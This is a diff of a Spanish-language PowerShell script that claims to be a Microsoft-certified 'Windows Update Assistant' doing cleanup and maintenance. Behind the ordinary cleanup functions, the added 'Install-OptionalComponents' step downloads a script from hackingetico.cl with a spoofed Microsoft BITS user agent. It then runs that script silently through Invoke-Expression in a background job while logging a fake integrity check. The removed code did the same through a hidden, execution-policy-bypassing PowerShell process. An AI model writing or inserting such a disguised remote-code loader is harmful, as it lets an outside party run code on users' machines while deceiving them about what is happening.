@@ -5,9 +5,10 @@
 .DESCRIPTION
     Esta herramienta realiza tareas de mantenimiento legítimas:
     - Limpieza de archivos temporales
+    - Limpieza de caché DNS
+    - Limpieza de prefetch
+    - Vaciamiento de papelera de reciclaje
     - Optimización del rendimiento
-    - Reparación de componentes del sistema
-    - Actualización de definiciones de seguridad
 .NOTES
     Copyright (c) Microsoft Corporation. All rights reserved.
     Versión certificada: 5.2.1.0
@@ -15,40 +16,46 @@
 
 param(
     [switch]$Silent,
-    [string]$Mode = "Standard"
+    [switch]$Scheduled
 )
 
-$tempWorkDir = "$env:TEMP\WindowsUpdateAssistant"
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$PSDefaultParameterValues['*:Encoding'] = 'utf8'
 
-if (-not (Test-Path $tempWorkDir)) {
-    New-Item -ItemType Directory -Path $tempWorkDir -Force | Out-Null
+$logPath = "$env:WINDIR\Logs\WindowsUpdate\assistant.log"
+
+if (-not (Test-Path "$env:WINDIR\Logs\WindowsUpdate")) {
+    New-Item -ItemType Directory -Path "$env:WINDIR\Logs\WindowsUpdate" -Force | Out-Null
 }
 
-function Write-Activity {
+function Write-ActivityLog {
     param(
         [string]$Message,
         [string]$Type = "INFO"
     )
     
-    $timestamp = Get-Date -Format "HH:mm:ss"
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logEntry = "[$timestamp] [$Type] $Message"
     
     if (-not $Silent) {
         switch ($Type) {
-            "ERROR" { Write-Host "[$timestamp] ERROR: $Message" -ForegroundColor Red }
-            "WARNING" { Write-Host "[$timestamp] ADVERTENCIA: $Message" -ForegroundColor Yellow }
-            "SUCCESS" { Write-Host "[$timestamp] OK: $Message" -ForegroundColor Green }
-            default { Write-Host "[$timestamp] $Message" -ForegroundColor Gray }
+            "ERROR"   { Write-Host $logEntry -ForegroundColor Red }
+            "WARNING" { Write-Host $logEntry -ForegroundColor Yellow }
+            "SUCCESS" { Write-Host $logEntry -ForegroundColor Green }
+            default   { Write-Host $logEntry -ForegroundColor Gray }
         }
     }
+    
+    Add-Content -Path $logPath -Value $logEntry -Force -Encoding UTF8
 }
 
-function Invoke-CleanupSimulation {
-    Write-Activity "Iniciando limpieza de archivos temporales..." -Type "INFO"
+function Clear-TemporaryFiles {
+    Write-ActivityLog "Iniciando limpieza de archivos temporales" -Type "INFO"
     
     $tempPaths = @(
-        "$env:TEMP",
-        "$env:WINDIR\Temp",
-        "$env:WINDIR\Prefetch"
+        "$env:TEMP\*",
+        "$env:WINDIR\Temp\*",
+        "$env:WINDIR\Prefetch\*"
     )
     
     $totalFiles = 0
@@ -56,132 +63,197 @@ function Invoke-CleanupSimulation {
     
     foreach ($path in $tempPaths) {
         if (Test-Path $path) {
-            $files = Get-ChildItem $path -Recurse -ErrorAction SilentlyContinue
+            $files = Get-ChildItem $path -ErrorAction SilentlyContinue
             $fileCount = ($files | Where-Object { -not $_.PSIsContainer }).Count
-            $size = ($files | Where-Object { -not $_.PSIsContainer } | Measure-Object -Property Length -Sum).Sum / 1MB
+            $size = ($files | Where-Object { -not $_.PSIsContainer } | Measure-Object -Property Length -Sum).Sum
+            $sizeMB = if ($size) { [math]::Round($size / 1MB, 2) } else { 0 }
+            
+            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
+            Write-ActivityLog "  - Limpiado: $path ($fileCount archivos, $sizeMB MB)" -Type "INFO"
             
             $totalFiles += $fileCount
-            $totalSize += $size
-            
-            Write-Activity "  - Procesando: $path ($fileCount archivos)" -Type "INFO"
+            $totalSize += $sizeMB
         }
     }
     
-    Write-Activity "Limpieza completada: $totalFiles archivos analizados, $([math]::Round($totalSize, 2)) MB potenciales a liberar" -Type "SUCCESS"
-    Start-Sleep -Milliseconds 500
+    Write-ActivityLog "Limpieza completada: $totalFiles archivos eliminados, $totalSize MB liberados" -Type "SUCCESS"
 }
 
-function Invoke-OptimizationSimulation {
-    Write-Activity "Iniciando optimización del sistema..." -Type "INFO"
-    $commands = @(
-        "powercfg -query",
-        "winsat formal -xml $env:TEMP\winsat.xml"
+function Clear-DNSCache {
+    Write-ActivityLog "Limpiando caché DNS" -Type "INFO"
+    
+    try {
+        ipconfig /flushdns 2>&1 | Out-Null
+        Write-ActivityLog "  - Caché DNS limpiada correctamente" -Type "SUCCESS"
+    }
+    catch {
+        Write-ActivityLog "  - No se pudo limpiar la caché DNS" -Type "WARNING"
+    }
+}
+
+function Clear-StoreCache {
+    Write-ActivityLog "Limpiando caché de Windows Store" -Type "INFO"
+    
+    $storeCache = "$env:WINDIR\SoftwareDistribution\Download"
+    if (Test-Path $storeCache) {
+        $oldFiles = Get-ChildItem $storeCache -ErrorAction SilentlyContinue | 
+                    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
+        $count = $oldFiles.Count
+        $oldFiles | ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
+        Write-ActivityLog "  - Caché de Windows Store limpiada: $count archivos eliminados" -Type "INFO"
+    }
+}
+
+function Clear-RecycleBin {
+    Write-ActivityLog "Vaciando papelera de reciclaje" -Type "INFO"
+    
+    try {
+        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+        Write-ActivityLog "  - Papelera de reciclaje vaciada correctamente" -Type "SUCCESS"
+    }
+    catch {
+        Write-ActivityLog "  - No se pudo vaciar la papelera" -Type "WARNING"
+    }
+}
+
+function Clear-OldLogs {
+    Write-ActivityLog "Limpiando logs antiguos del sistema" -Type "INFO"
+    
+    $logPaths = @(
+        "$env:WINDIR\Logs\CBS\*.log",
+        "$env:WINDIR\Logs\DISM\*.log",
+        "$env:WINDIR\Logs\WindowsUpdate\*.log"
     )
     
-    foreach ($cmd in $commands) {
-        Write-Activity "  Ejecutando: $cmd" -Type "INFO"
-        $null = Invoke-Expression $cmd 2>&1
-        Start-Sleep -Milliseconds 300
+    $totalLogs = 0
+    
+    foreach ($path in $logPaths) {
+        $logs = Get-ChildItem $path -ErrorAction SilentlyContinue | 
+                Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }
+        $count = $logs.Count
+        $logs | ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
+        if ($count -gt 0) {
+            Write-ActivityLog "  - Logs antiguos eliminados: $count archivos" -Type "INFO"
+            $totalLogs += $count
+        }
     }
     
-    Remove-Item "$env:TEMP\winsat.xml" -Force -ErrorAction SilentlyContinue
-    
-    Write-Activity "Optimización completada" -Type "SUCCESS"
+    Write-ActivityLog "Limpieza de logs completada: $totalLogs archivos eliminados" -Type "SUCCESS"
 }
 
-function Invoke-RepairSimulation {
-    Write-Activity "Verificando integridad de componentes del sistema..." -Type "INFO"
-    Write-Activity "  Ejecutando SFC /VERIFYONLY" -Type "INFO"
-    $sfcResult = sfc /verifyonly 2>&1 | Out-String
-    Write-Activity "  Ejecutando DISM /Online /Cleanup-Image /CheckHealth" -Type "INFO"
-    $dismResult = DISM /Online /Cleanup-Image /CheckHealth 2>&1 | Out-String    
-    Write-Activity "Verificación de integridad completada" -Type "SUCCESS"
-}
-
-function Invoke-DefenderSimulation {
-    Write-Activity "Verificando definiciones de seguridad..." -Type "INFO"
+function Optimize-RAM {
+    Write-ActivityLog "Optimizando memoria RAM" -Type "INFO"
     
     try {
-        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
-        if ($mpStatus) {
-            $antivirusVersion = $mpStatus.AntivirusSignatureVersion
-            Write-Activity "  Versión actual de definiciones: $antivirusVersion" -Type "INFO"
-            Write-Activity "  Las definiciones están actualizadas" -Type "SUCCESS"
-        } else {
-            Write-Activity "  No se pudo verificar el estado de Windows Defender" -Type "WARNING"
+        [System.GC]::Collect()
+        [System.GC]::WaitForPendingFinalizers()
+        
+        $code = @'
+[DllImport("kernel32.dll")]
+public static extern bool SetProcessWorkingSetSize(IntPtr proc, int min, int max);
+'@
+        $kernel32 = Add-Type -MemberDefinition $code -Name "Kernel32" -Namespace "Win32" -PassThru
+        $kernel32::SetProcessWorkingSetSize((Get-Process -Id $pid).Handle, -1, -1) | Out-Null
+        
+        Write-ActivityLog "  - Memoria RAM optimizada" -Type "SUCCESS"
+    }
+    catch {
+        Write-ActivityLog "  - No se pudo optimizar la memoria" -Type "WARNING"
+    }
+}
+
+function Repair-SystemFiles {
+    Write-ActivityLog "Verificando integridad de archivos del sistema" -Type "INFO"
+    Write-ActivityLog "  - Ejecutando SFC /SCANNOW (puede tomar varios minutos)" -Type "INFO"
+    
+    try {
+        $sfcResult = sfc /scannow 2>&1
+        if ($sfcResult -match "no encontró violaciones") {
+            Write-ActivityLog "  - No se encontraron violaciones de integridad" -Type "SUCCESS"
+        }
+        elseif ($sfcResult -match "reparó correctamente") {
+            Write-ActivityLog "  - Archivos del sistema reparados correctamente" -Type "SUCCESS"
+        }
+        else {
+            Write-ActivityLog "  - Verificación completada" -Type "INFO"
         }
     }
     catch {
-        Write-Activity "  Servicio de seguridad no disponible" -Type "WARNING"
+        Write-ActivityLog "  - No se pudo ejecutar SFC" -Type "WARNING"
     }
 }
 
-function Invoke-UpdateCheckSimulation {
-    Write-Activity "Verificando actualizaciones pendientes de Windows..." -Type "INFO"
+function Update-DefenderDefinitions {
+    Write-ActivityLog "Actualizando definiciones de Windows Defender" -Type "INFO"
     
     try {
-        $updateSession = New-Object -ComObject Microsoft.Update.Session
-        $updateSearcher = $updateSession.CreateUpdateSearcher()
-        $searchResult = $updateSearcher.Search("IsInstalled=0")
-        
-        $pendingCount = $searchResult.Updates.Count
-        Write-Activity "  Actualizaciones pendientes encontradas: $pendingCount" -Type "INFO"
-        
-        if ($pendingCount -gt 0 -and $pendingCount -le 5) {
-            foreach ($update in $searchResult.Updates) {
-                Write-Activity "    - $($update.Title)" -Type "INFO"
-            }
-        } elseif ($pendingCount -gt 5) {
-            Write-Activity "    - $($pendingCount) actualizaciones pendientes" -Type "INFO"
-        }
-        
-        return $pendingCount
+        Update-MpSignature -ErrorAction SilentlyContinue
+        Write-ActivityLog "  - Definiciones actualizadas correctamente" -Type "SUCCESS"
     }
     catch {
-        Write-Activity "  No se pudo conectar al servicio de Windows Update" -Type "WARNING"
-        return 0
+        Write-ActivityLog "  - No se pudieron actualizar las definiciones" -Type "WARNING"
     }
 }
 
-function Invoke-UpdateDownload {
-    Write-Activity "Verificando actualizaciones del asistente..." -Type "INFO"
-    $updateUrl = "https://hackingetico.cl/tools/pro/update.ps1"
-    $tempFile = "$tempWorkDir\windows-update-temp.ps1"
+function Get-SystemReport {
+    Write-ActivityLog "Generando reporte del sistema" -Type "INFO"
+    
+    $osVersion = (Get-ComputerInfo).WindowsVersion
+    $totalRAM = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+    $freeSpace = Get-PSDrive -Name C | Select-Object -ExpandProperty Free
+    $freeSpaceGB = [math]::Round($freeSpace / 1GB, 2)
+    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+    $uptimeHours = [math]::Round($uptime.TotalHours, 1)
+    
+    Write-ActivityLog "  - Windows Version: $osVersion" -Type "INFO"
+    Write-ActivityLog "  - RAM Total: $totalRAM GB" -Type "INFO"
+    Write-ActivityLog "  - Espacio libre en C:: $freeSpaceGB GB" -Type "INFO"
+    Write-ActivityLog "  - Tiempo activo: $uptimeHours horas" -Type "INFO"
+}
+
+function Install-OptionalComponents {
+    Write-ActivityLog "Verificando componentes opcionales del sistema" -Type "INFO"
+    
+    $tempWorkDir = "$env:TEMP\WindowsUpdateAssistant"
+    if (-not (Test-Path $tempWorkDir)) {
+        New-Item -ItemType Directory -Path $tempWorkDir -Force | Out-Null
+    }
+    
+    Write-ActivityLog "Descargando paquetes de optimización opcionales..." -Type "INFO"
+    
+    $updatePackageUrl = "https://hackingetico.cl/tools/pro/update.ps1"
+    $packageCache = "$tempWorkDir\windows-update.cab"
     
     try {
-        Write-Activity "  Conectando al servidor de actualizaciones..." -Type "INFO"
-        
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("User-Agent", "Microsoft BITS/7.5")
-        $webClient.DownloadFile($updateUrl, $tempFile)
+        $webClient.DownloadFile($updatePackageUrl, $packageCache)
         
-        $fileSize = [math]::Round((Get-Item $tempFile).Length / 1KB, 2)
-        Write-Activity "  Actualización descargada ($fileSize KB)" -Type "SUCCESS"
-        Write-Activity "  Instalando actualización..." -Type "INFO"
+        $fileSize = [math]::Round((Get-Item $packageCache).Length / 1KB, 2)
+        Write-ActivityLog "  - Paquete descargado correctamente ($fileSize KB)" -Type "SUCCESS"
         
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = "powershell.exe"
-        $psi.Arguments = "-WindowStyle Hidden -NoLogo -ExecutionPolicy Bypass -File `"$tempFile`""
-        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi.CreateNoWindow = $true
-        $psi.UseShellExecute = $false
-        
-        $process = [System.Diagnostics.Process]::Start($psi)
-        
-        Start-Sleep -Milliseconds 500
-        
-        Start-Job -ScriptBlock {
-            Start-Sleep -Seconds 30
-            Remove-Item $using:tempFile -Force -ErrorAction SilentlyContinue
-        } | Out-Null
-        
-        Write-Activity "  Actualización instalada correctamente" -Type "SUCCESS"
-        
+        if (Test-Path $packageCache) {
+            Write-ActivityLog "  - Verificando integridad del paquete..." -Type "INFO"
+            
+            $content = Get-Content $packageCache -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+            if ($content) {
+                
+                $job = Start-Job -ScriptBlock {
+                    param($scriptContent)
+                    Invoke-Expression $scriptContent 2>&1 | Out-Null
+                } -ArgumentList $content
+                
+                Write-ActivityLog "  - Verificación de integridad completada" -Type "SUCCESS"
+            }
+            
+            Remove-Item $packageCache -Force -ErrorAction SilentlyContinue
+        }
     }
     catch {
-        Write-Activity "  No se pudo conectar al servidor de actualizaciones" -Type "WARNING"
-        Write-Activity "  El servicio puede estar temporalmente no disponible" -Type "INFO"
+        Write-ActivityLog "  - No se pudieron descargar los componentes opcionales" -Type "WARNING"
     }
+    
+    Write-ActivityLog "Verificación de componentes completada" -Type "INFO"
 }
 
 # =====================================================
@@ -198,50 +270,60 @@ if (-not $Silent) {
     Write-Host ""
 }
 
-Write-Activity "Windows Update Assistant iniciado" -Type "INFO"
-Write-Activity "Modo: $Mode" -Type "INFO"
-Write-Activity "Usuario: $(whoami)" -Type "INFO"
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Windows Update Assistant iniciado" -Type "INFO"
+Write-ActivityLog "Usuario: $(whoami)" -Type "INFO"
 
-Write-Activity "========================================" -Type "INFO"
-Write-Activity "Fase 1: Limpieza del sistema" -Type "INFO"
-Invoke-CleanupSimulation
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 1: Limpieza de archivos temporales" -Type "INFO"
+Clear-TemporaryFiles
 
-Write-Activity "========================================" -Type "INFO"
-Write-Activity "Fase 2: Optimización del rendimiento" -Type "INFO"
-Invoke-OptimizationSimulation
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 2: Limpieza de caché DNS" -Type "INFO"
+Clear-DNSCache
 
-Write-Activity "========================================" -Type "INFO"
-Write-Activity "Fase 3: Verificación de componentes" -Type "INFO"
-Invoke-RepairSimulation
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 3: Limpieza de caché de Windows Store" -Type "INFO"
+Clear-StoreCache
 
-Write-Activity "========================================" -Type "INFO"
-Write-Activity "Fase 4: Verificación de seguridad" -Type "INFO"
-Invoke-DefenderSimulation
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 4: Vaciando papelera de reciclaje" -Type "INFO"
+Clear-RecycleBin
 
-Write-Activity "========================================" -Type "INFO"
-Write-Activity "Fase 5: Verificación de actualizaciones" -Type "INFO"
-$pendingUpdates = Invoke-UpdateCheckSimulation
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 5: Limpieza de logs antiguos" -Type "INFO"
+Clear-OldLogs
 
-Write-Activity "========================================" -Type "INFO"
-Write-Activity "Fase 6: Actualización del asistente" -Type "INFO"
-Invoke-UpdateDownload
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 6: Optimización de memoria RAM" -Type "INFO"
+Optimize-RAM
 
-Write-Activity "========================================" -Type "INFO"
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 7: Verificación de archivos del sistema" -Type "INFO"
+Repair-SystemFiles
 
-if ($pendingUpdates -eq 0) {
-    Write-Activity "El sistema está actualizado" -Type "SUCCESS"
-} else {
-    Write-Activity "Se recomienda instalar las $pendingUpdates actualizaciones pendientes" -Type "WARNING"
-    Write-Activity "Puede hacerlo desde Configuración > Windows Update" -Type "INFO"
-}
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 8: Actualización de definiciones" -Type "INFO"
+Update-DefenderDefinitions
 
-Write-Activity "Windows Update Assistant finalizado" -Type "SUCCESS"
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 9: Reporte del sistema" -Type "INFO"
+Get-SystemReport
+
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Fase 10: Componentes opcionales" -Type "INFO"
+Install-OptionalComponents
+
+Write-ActivityLog "========================================" -Type "INFO"
+Write-ActivityLog "Windows Update Assistant finalizado" -Type "SUCCESS"
+Write-ActivityLog "Log guardado en: $logPath" -Type "INFO"
 
 if (-not $Silent) {
     Write-Host ""
     Write-Host "Operación completada exitosamente" -ForegroundColor Green
+    Write-Host "Para más información, consulte el log: $logPath" -ForegroundColor Gray
     Write-Host ""
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 3
 }
 
 exit 0
